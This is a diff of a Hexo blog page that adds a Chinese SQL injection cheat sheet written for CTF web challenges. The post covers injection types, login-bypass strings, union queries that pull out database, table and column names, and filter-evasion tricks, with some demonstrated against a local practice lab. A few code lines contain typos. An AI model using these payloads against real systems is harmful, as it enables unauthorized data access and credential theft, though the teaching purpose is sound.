@@ -76,7 +76,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="CTF Web,SQL注入漏洞,数据库,">
 
 
 
@@ -87,17 +87,18 @@
 
 
 
-<meta name="description" content="等级：LV8">
-<meta property="og:type" content="website">
-<meta property="og:title" content="sitemap">
-<meta property="og:url" content="https://kevens10.github.io/sitemap/index-1.html">
+<meta name="description" content="0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种">
+<meta name="keywords" content="CTF Web,SQL注入漏洞,数据库">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入总结">
+<meta property="og:url" content="https://kevens10.github.io/2019/10/20/SQL注入总结/index.html">
 <meta property="og:site_name" content="Keven S">
-<meta property="og:description" content="等级：LV8">
+<meta property="og:description" content="0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-03T04:23:46.326Z">
+<meta property="og:updated_time" content="2019-10-21T04:53:33.322Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sitemap">
-<meta name="twitter:description" content="等级：LV8">
+<meta name="twitter:title" content="SQL注入总结">
+<meta name="twitter:description" content="0x00 SQL注入原理与分类原理SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。 分类1按照参数类型可分为两种：数字型和字符型。当发生注入点的参数为整数时，比如 ID，num，page等，这种">
 
 
 
@@ -127,7 +128,7 @@
 
 
 
-  <link rel="canonical" href="https://kevens10.github.io/sitemap/index-1.html">
+  <link rel="canonical" href="https://kevens10.github.io/2019/10/20/SQL注入总结/">
 
 
 
@@ -149,7 +150,7 @@
 
 
 
-  <title>sitemap | Keven S</title>
+  <title>SQL注入总结 | Keven S</title>
   
 
 
@@ -330,33 +331,317 @@
 
   <div id="posts" class="posts-expand">
     
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://kevens10.github.io/2019/10/20/SQL注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Keven">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/temp.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Keven S">
+    </span>
+
     
-    
-    <div class="post-block page">
       <header class="post-header">
 
-	<h1 class="post-title" itemprop="name headline">sitemap</h1>
-
-
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
         
         
+          <h1 class="post-title" itemprop="name headline">SQL注入总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-20T22:09:33+08:00">
+                2019-10-20
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-10-21T12:53:33+08:00">
+                2019-10-21
+              </time>
+            
+          </span>
+
           
-        
-      </div>
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">Web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 浏览
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>次
+            </span>
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2,092 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
       
       
+
+      
+        <h2 id="0x00-SQL注入原理与分类"><a href="#0x00-SQL注入原理与分类" class="headerlink" title="0x00 SQL注入原理与分类"></a>0x00 SQL注入原理与分类</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>SQL注入是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。比如查询、删除，增加，修改数据等等，如果数据库的用户权限足够大，还可以对操作系统执行操作。</p>
+<h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>按照参数类型可分为两种：数字型和字符型。<br>当发生注入点的参数为整数时，比如 ID，num，page等，这种形式的就属于数字型注入漏洞。同样，当注入点是字符串时，则称为字符型注入，字符型注入需要引号来闭合。</p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>根据数据库返回的结果，分为回显注入、报错注入、盲注。</p>
+<p>回显注入：可以直接在存在注入点的当前页面中获取返回结果。</p>
+<p>报错注入：程序将数据库的返回错误信息直接显示在页面中，虽然没有返回数据库的查询结果，但是可以构造一些报错语句从错误信息中获取想要的结果。</p>
+<p>盲注：程序后端屏蔽了数据库的错误信息，没有直接显示结果也没有报错信息，只能通过数据库的逻辑和延时函数来判断注入的结果。根据表现形式的不同，盲注又分为based boolean和based time两种类型。</p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>按照注入位置及方式不同分为：post注入，get注入，cookie注入，盲注，延时注入，搜索注入，base64注入</p>
+<h2 id="0X01-注入常见参数"><a href="#0X01-注入常见参数" class="headerlink" title="0X01 注入常见参数"></a>0X01 注入常见参数</h2><pre><code>user()：当前数据库用户
+database()：当前数据库名
+version()：当前使用的数据库版本
+@@datadir：数据库存储数据路径
+concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password)
+group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来
+concat_ws()：用法类似
+hex() 和 unhex()：用于 hex 编码解码
+load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\
+select xxoo into outfile &apos;路径&apos;：权限较高时可直接写文件</code></pre><h2 id="0x02-后台万能密码"><a href="#0x02-后台万能密码" class="headerlink" title="0x02 后台万能密码"></a>0x02 后台万能密码</h2><pre><code>admin&apos; --
+admin&apos; #
+admin&apos;/*
+&apos; or 1=1--
+&apos; or 1=1#
+&apos; or 1=1/*
+&apos;) or &apos;1&apos;=&apos;1--
+&apos;) or (&apos;1&apos;=&apos;1--
+以不同的用户登陆 &apos; UNION SELECT 1, &apos;anotheruser&apos;, &apos;doesnt matter&apos;, 1--</code></pre><h2 id="0x03-Mysql相关知识"><a href="#0x03-Mysql相关知识" class="headerlink" title="0x03 Mysql相关知识"></a>0x03 Mysql相关知识</h2><p>MySQL数据库的特有的表是 information_schema.tables  , access数据库特有的表是 msysobjects 、SQLServer 数据库特有的表是 sysobjects 。那么，我们就可以用如下的语句判断数据库。哪个页面正常显示，就属于哪个数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//判断是否是 Mysql数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from information_schema.tables) #</span><br><span class="line">	 </span><br><span class="line">//判断是否是 access数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from msysobjects) #</span><br><span class="line"></span><br><span class="line">//判断是否是 Sqlserver数据库</span><br><span class="line">http://127.0.0.1/sqli/Less-5/?id=1&apos; and exists(select*from sysobjects) #</span><br></pre></td></tr></table></figure>
+
+<p>对于MySQL数据库，information_schema 数据库中的表都是只读的，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个视图，不是基本表，没有关联的文件。</p>
+<h5 id="mysql中注释符：-、-、-–"><a href="#mysql中注释符：-、-、-–" class="headerlink" title="mysql中注释符：#   、/**/  、  –"></a>mysql中注释符：#   、/**/  、  –</h5><h5 id="information-schema数据库中三个很重要的表："><a href="#information-schema数据库中三个很重要的表：" class="headerlink" title="information_schema数据库中三个很重要的表："></a>information_schema数据库中三个很重要的表：</h5><p>•    information_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名</p>
+<p>•    information_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名</p>
+<p>•    information_schema.columns:    该数据表存储了mysql数据库中的所有列的列名</p>
+<h5 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h5><p>ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii(“a”)=97</p>
+<p>length(str) : 返回给定字符串的长度，如  length(“string”)=6</p>
+<p>substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr(“chinese”,3,2)=”in”</p>
+<p>substr()、stbstring()、mid()  三个函数的用法、功能均一致</p>
+<p>concat(username)：将查询到的username连在一起，默认用逗号分隔</p>
+<p>concat(str1,’<em>‘,str2)：将字符串str1和str2的数据查询到一起，中间用</em>连接<br>group_concat(username) ：将username数据查询在一起，用逗号连接</p>
+<p>limit 0,1：查询第1个数<br>limit  1,1： 查询第2个数<br>limit  n,1： 查询第n+1个数</p>
+<p>CONV(n,from_radix,to_radix)：用于将n从from_radix进制转到to_radix进制</p>
+<h2 id="0x04-判断是否存在SQL注入"><a href="#0x04-判断是否存在SQL注入" class="headerlink" title="0x04 判断是否存在SQL注入"></a>0x04 判断是否存在SQL注入</h2><p>1.可以用网站漏洞扫描工具进行扫描，常见的网站漏洞扫描工具有 AWVS、AppScan、OWASP-ZAP、Nessus 等。</p>
+<p>2.先加单引号、双引号、单括号、双括号等看看是否报错，如果报错就肯定存在SQL注入漏洞了。<br>还有在URL后面加and 1=1 、 and 1=2看页面是否显示一样，显示不一样的话，肯定存在SQL注入漏洞了。</p>
+<h2 id="0x05-获取数据库名"><a href="#0x05-获取数据库名" class="headerlink" title="0x05 获取数据库名"></a>0x05 获取数据库名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT database();</span><br><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br><span class="line">id=1&apos; union select 1,database() #;</span><br><span class="line">admin_name=1&quot; union select database(),2%23;</span><br><span class="line">id=1%27%20anandd%201=2%20ununionion%20seselectlect%201,database()%23;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-获取表名"><a href="#0x06-获取表名" class="headerlink" title="0x06 获取表名"></a>0x06 获取表名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select table_name from information_schema.tables where table_schema=database(); </span><br><span class="line">admin_name=1&quot; union select (select table_name from information_schema.tables where table_schema=database() limit 0,1),2%23;</span><br><span class="line">union select 1,table_name from information_schema.tables where table_schema=&apos; &apos;;</span><br><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() #;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-获取列名"><a href="#0x07-获取列名" class="headerlink" title="0x07 获取列名"></a>0x07 获取列名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">union select group_concat(column_name) from information_schema.columns where table_name = &apos;tablename&apos;;</span><br><span class="line">admin_name=1&quot; union select (select column_name from information_schema.columns where table_name=&apos;flag1&apos;),2%23;</span><br><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&apos;flag1&apos; %23;</span><br><span class="line">union select 1,column_name from information_schema.columns where table_schema=&apos; &apos; and table_name=&apos; &apos;;</span><br><span class="line">id=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=0x666c3467# //这里需要用16进制绕过</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-查询结果"><a href="#0x08-查询结果" class="headerlink" title="0x08 查询结果"></a>0x08 查询结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; ununionion seselectlect 1, group_concat(flag1) from flag1 %23；</span><br><span class="line">admin_name=1&quot; union select (select flag1 from flag1),2%23；</span><br><span class="line">d=-1&apos; union select 1,2,3,skctf_flag from fl4g#；</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-常用的绕过"><a href="#0x09-常用的绕过" class="headerlink" title="0x09 常用的绕过"></a>0x09 常用的绕过</h2><h5 id="绕过引号限制"><a href="#绕过引号限制" class="headerlink" title="绕过引号限制"></a>绕过引号限制</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hex 编码</span><br><span class="line"></span><br><span class="line">select * from users where username = 0x61646D696E</span><br><span class="line"></span><br><span class="line">char() 函数</span><br><span class="line"></span><br><span class="line">select * from users where username = char(97, 100, 109, 105, 110)</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过字符串黑名单"><a href="#绕过字符串黑名单" class="headerlink" title="绕过字符串黑名单"></a>绕过字符串黑名单</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select &apos;a&apos; &apos;d&apos; &apos;mi&apos; &apos;n&apos;;</span><br><span class="line">select concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br><span class="line">select select_WS(&apos;&apos;, &apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br><span class="line">select group_concat(&apos;a&apos;, &apos;d&apos;, &apos;m&apos;, &apos;i&apos;, &apos;n&apos;);</span><br></pre></td></tr></table></figure>
+
+<h5 id="绕过逗号"><a href="#绕过逗号" class="headerlink" title="绕过逗号"></a>绕过逗号</h5><p>substr(),mid(),limit这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select substr(database(0 from 1 for 1);</span><br><span class="line">select mid(database(0 from 1 for 1);</span><br><span class="line"></span><br><span class="line">select * from news limit 0,1；</span><br><span class="line"># 等价于下面这条SQL语句</span><br><span class="line">select * from news limit 1 offset 0；</span><br></pre></td></tr></table></figure>
+
+<h5 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h5><p>使用二分查找的时候需要使用到比较操作符来进行查找。<br>需要使用到greatest来进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64；</span><br></pre></td></tr></table></figure>
+
+<p>如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符。<br>greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x10-常用sql语句"><a href="#0x10-常用sql语句" class="headerlink" title="0x10 常用sql语句"></a>0x10 常用sql语句</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">选择：select * from table1 where 范围 </span><br><span class="line">插入：insert into table1(field1,field2) values(value1,value2) </span><br><span class="line">删除：delete from table1 where 范围 </span><br><span class="line">更新：update table1 set field1=value1 where 范围 </span><br><span class="line">查找：select * from table1 where field1 like &apos;%value1%&apos; </span><br><span class="line">排序：select * from table1 order by field1,field2 [desc] </span><br><span class="line">总数：select count as totalcount from table1 </span><br><span class="line">求和：select sum(field1) as sumvalue from table1 </span><br><span class="line">平均：select avg(field1) as avgvalue from table1 </span><br><span class="line">最大：select max(field1) as maxvalue from table1 </span><br><span class="line">最小：select min(field1) as minvalue from table1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">UNION 运算符 </span><br><span class="line">UNION 运算符通过组合其他两个结果表（例如 TABLE1 和 TABLE2）并消去表中任何重复行而派生 </span><br><span class="line">出一个结果表。当 ALL 随 UNION 一起使用时（即 UNION ALL），不消除重复行。两种情况下，派 </span><br><span class="line">生表的每一行不是来自 TABLE1 就是来自 TABLE2。 </span><br><span class="line">EXCEPT 运算符 </span><br><span class="line">EXCEPT 运算符通过包括所有在 TABLE1 中但不在 TABLE2 中的行并消除所有重复行而派生出一个 </span><br><span class="line">结果表。当 ALL 随 EXCEPT 一起使用时 (EXCEPT ALL)，不消除重复行。 </span><br><span class="line">INTERSECT 运算符 </span><br><span class="line">INTERSECT 运算符通过只包括 TABLE1 和 TABLE2 中都有的行并消除所有重复行而派生出一个结果 </span><br><span class="line">表。当 ALL 随 INTERSECT 一起使用时 (INTERSECT ALL)，不消除重复行。 </span><br><span class="line">注：使用运算词的几个查询结果行必须是一致的。</span><br></pre></td></tr></table></figure>
       
     </div>
     
     
     
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Keven
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://kevens10.github.io/2019/10/20/SQL注入总结/" title="SQL注入总结">https://kevens10.github.io/2019/10/20/SQL注入总结/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:20px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"><i class="fa fa-tag"></i> CTF Web</a>
+          
+            <a href="/tags/SQL注入漏洞/" rel="tag"><i class="fa fa-tag"></i> SQL注入漏洞</a>
+          
+            <a href="/tags/数据库/" rel="tag"><i class="fa fa-tag"></i> 数据库</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/19/仿射密码/" rel="next" title="仿射密码">
+                <i class="fa fa-chevron-left"></i> 仿射密码
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/20/SQL回显注入/" rel="prev" title="SQL回显注入">
+                SQL回显注入 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
   </div>
 
 
@@ -396,8 +681,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -545,6 +839,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-SQL注入原理与分类"><span class="nav-number">1.</span> <span class="nav-text">0x00 SQL注入原理与分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理"><span class="nav-number">1.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">1.2.</span> <span class="nav-text">分类</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1"><span class="nav-number">1.2.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2"><span class="nav-number">1.2.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3"><span class="nav-number">1.2.3.</span> <span class="nav-text">3</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-注入常见参数"><span class="nav-number">2.</span> <span class="nav-text">0X01 注入常见参数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-后台万能密码"><span class="nav-number">3.</span> <span class="nav-text">0x02 后台万能密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-Mysql相关知识"><span class="nav-number">4.</span> <span class="nav-text">0x03 Mysql相关知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql中注释符：-、-、-–"><span class="nav-number">4.0.0.1.</span> <span class="nav-text">mysql中注释符：#   、/**/  、  –</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#information-schema数据库中三个很重要的表："><span class="nav-number">4.0.0.2.</span> <span class="nav-text">information_schema数据库中三个很重要的表：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#常用函数"><span class="nav-number">4.0.0.3.</span> <span class="nav-text">常用函数</span></a></li></ol></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-判断是否存在SQL注入"><span class="nav-number">5.</span> <span class="nav-text">0x04 判断是否存在SQL注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-获取数据库名"><span class="nav-number">6.</span> <span class="nav-text">0x05 获取数据库名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-获取表名"><span class="nav-number">7.</span> <span class="nav-text">0x06 获取表名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x07-获取列名"><span class="nav-number">8.</span> <span class="nav-text">0x07 获取列名</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x08-查询结果"><span class="nav-number">9.</span> <span class="nav-text">0x08 查询结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x09-常用的绕过"><span class="nav-number">10.</span> <span class="nav-text">0x09 常用的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过引号限制"><span class="nav-number">10.0.0.1.</span> <span class="nav-text">绕过引号限制</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过字符串黑名单"><span class="nav-number">10.0.0.2.</span> <span class="nav-text">绕过字符串黑名单</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过逗号"><span class="nav-number">10.0.0.3.</span> <span class="nav-text">绕过逗号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#比较符-lt-gt-绕过"><span class="nav-number">10.0.0.4.</span> <span class="nav-text">比较符(&lt;,&gt;)绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x10-常用sql语句"><span class="nav-number">11.</span> <span class="nav-text">0x10 常用sql语句</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
 
